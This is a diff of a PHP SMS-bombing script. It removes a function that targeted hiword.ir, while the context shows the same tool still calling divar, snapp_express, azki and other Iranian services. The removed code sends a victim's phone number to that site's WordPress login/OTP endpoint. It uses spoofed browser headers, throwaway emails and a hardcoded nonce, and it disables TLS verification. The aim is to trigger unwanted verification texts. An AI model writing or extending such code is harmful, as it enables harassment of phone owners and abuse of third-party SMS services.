@@ -13,7 +13,6 @@ function all($phone)
     divar($phone);  //ok
     bama($phone); //ok
     nobatir($phone); //ok
-    hiword($phone);  //ok
     snapp_express($phone);  //ok
     azki($phone);  //ok
     igap($phone);  //ok
@@ -349,39 +348,6 @@ function tikban($phone)
     curl_close($ch);
 }
 
-function hiword($phone)
-{
-    $ch = curl_init();
-    curl_setopt($ch, CURLOPT_URL, 'https://hiword.ir/wp-admin/admin-ajax.php');
-    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
-    curl_setopt($ch, CURLOPT_HTTPHEADER, [
-        'Accept: */*',
-        'Accept-Language: en-US,en;q=0.9,fa;q=0.8',
-        'Connection: keep-alive',
-        'Content-Type: application/x-www-form-urlencoded; charset=UTF-8',
-        'DNT: 1',
-        'Origin: https://hiword.ir',
-        'Referer: https://hiword.ir/?login=true',
-        'Sec-Fetch-Dest: empty',
-        'Sec-Fetch-Mode: cors',
-        'Sec-Fetch-Site: same-origin',
-        'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36',
-        'X-Requested-With: XMLHttpRequest',
-        'sec-ch-ua: "Google Chrome";v="111", "Not(A:Brand";v="8", "Chromium";v="111"',
-        'sec-ch-ua-mobile: ?0',
-        'sec-ch-ua-platform: "Windows"',
-        'Accept-Encoding: gzip',
-    ]);
-    $name = urlencode(generateRandomString());
-    $phone_value = 'action=digits_check_mob&countrycode=%2B98&mobileNo=' . $phone . '&csrf=ea0d9f93ad&login=2&username=&email=yesaca8655%40gpipes.com&captcha=&captcha_ses=&digits=1&json=1&whatsapp=0&digits_reg_name=' . $name . '&digregcode=%2B98&digits_reg_mail=' . $phone . '&digregscode2=%2B98&mobmail2=xqwfqw%40gmail.com&digits_reg_password=&dig_otp=&code=&dig_reg_mail=xqwfqw%40gmail.com&dig_nounce=ea0d9f93ad';
-    curl_setopt($ch, CURLOPT_POSTFIELDS, $phone_value);
-    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, FALSE);
-    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
-    $response = curl_exec($ch);
-
-    curl_close($ch);
-}
 
 function snapp_express($phone)
 {
